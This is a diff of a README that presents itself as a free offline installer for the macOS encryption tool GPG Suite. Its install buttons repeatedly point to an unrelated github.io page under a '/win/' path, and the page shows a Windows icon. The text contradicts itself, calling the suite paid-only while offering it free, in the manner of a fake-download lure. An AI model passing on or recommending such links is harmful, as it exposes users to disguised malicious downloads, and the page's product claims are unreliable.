@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Encryption-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 GPG Suite Free Installer** — GPG Suite is a free macOS package providing a complete set of OpenPGP encryption tools. Works without internet access, no account required. Full offline installation.
+**💻 GPG Suite Free Installer** — GPG Suite is a comprehensive macOS email encryption toolkit that integrates OpenPGP encryption into Apple Mail, Spotlight, and the system Services menu. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GPG Suite](https://img.shields.io/badge/⬇_Install_GPG%20Suite-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GPG Suite](https://img.shields.io/badge/⬇_Install_GPG+Suite-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About GPG Suite
 
-GPG Suite is a free macOS package providing a complete set of OpenPGP encryption tools. It integrates directly with Apple Mail for email encryption and signing, includes the GPG Keychain for key management, and provides GPG Services for encrypting any text or file.
+GPG Suite is a comprehensive macOS email encryption toolkit that integrates OpenPGP encryption into Apple Mail, Spotlight, and the system Services menu. Create and manage GPG keys, encrypt and sign emails, and verify signed messages from others with a native macOS experience. GPG Suite brings professional-grade email privacy to the Mac platform with minimal configuration.
 
 ---
 
 ## ❌ Problem: GPG Suite is hard to access
 
-- **macOS Only** — Windows users should use Gpg4win instead
-- **Apple Mail Integration** — macOS 12+ broke deep Mail integration requiring workarounds
-- **Complex Key Management** — PGP key exchange and trust model confusing for non-technical users
-- **Declining Mail Use** — Email encryption use is rare making the core functionality less relevant
+- **macOS Only** — macOS-specific GPG integration; Windows users need Gpg4win
+- **Commercial License** — GPG Suite currently requires paid license after trial
+- **Learning Curve** — Public-key cryptography concepts require dedicated learning
+- **Recipient Dependency** — Email encryption only works if recipients also have GPG keys
 
 ---
 
@@ -81,7 +81,7 @@ GPG Suite is a free macOS package providing a complete set of OpenPGP encryption
 
 <div align="center">
 
-[![⬇ Install GPG Suite](https://img.shields.io/badge/⬇_Install_GPG%20Suite-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GPG Suite](https://img.shields.io/badge/⬇_Install_GPG+Suite-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ GPG Suite is a free macOS package providing a complete set of OpenPGP encryption
 
 ---
 
-**GPG Suite Free Installer** — GPG Suite is a free macOS package providing a complete set of OpenPGP encryption tools. Install without internet connection today!
+**GPG Suite Free Installer** — GPG Suite is a comprehensive macOS email encryption toolkit that integrates OpenPGP encryption into Apple Mail, Spotlight, and the system Services menu. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install GPG Suite](https://img.shields.io/badge/⬇_Install_GPG%20Suite-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GPG Suite](https://img.shields.io/badge/⬇_Install_GPG+Suite-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
